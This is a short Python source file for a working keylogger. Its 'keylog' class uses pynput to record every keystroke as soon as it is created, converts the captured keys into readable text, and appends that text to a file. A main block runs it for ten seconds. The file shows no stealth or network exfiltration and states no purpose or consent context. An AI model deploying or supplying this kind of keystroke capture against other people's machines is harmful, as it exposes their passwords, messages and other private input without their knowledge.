from pynput.keyboard import Listener, Key

class keylog:
    def __init__(self) -> None:    
        self.keys = []
        self.listener = Listener(on_press = self.on_press)
        self._listener()

    def on_press(self, key):
        self.keys.append(key)

    def _listener(self):
        self.listener.start()

    def export_text(self):                    
        text = ""
        for i in self.keys:               
            if str(i) == "Key.space":
                text = f"{text} "               
            elif str(i) == "Key.enter":                 
                text = f"{text}\n"
            elif type(i) == Key:                                            
                text = f"{text} {str(i)} "
            else:
                text = f"{text}{str(i)[1:-1]}"
        self.keys = []
        return text
                       
    def write_to_file(self, path):
        with open(path, "a") as file:
            file.write(self.export_text())          

    def stop(self):
        self.listener.stop()
        
if __name__ == "__main__":
    keylogger = keylog()
    import time
    time.sleep(10)      

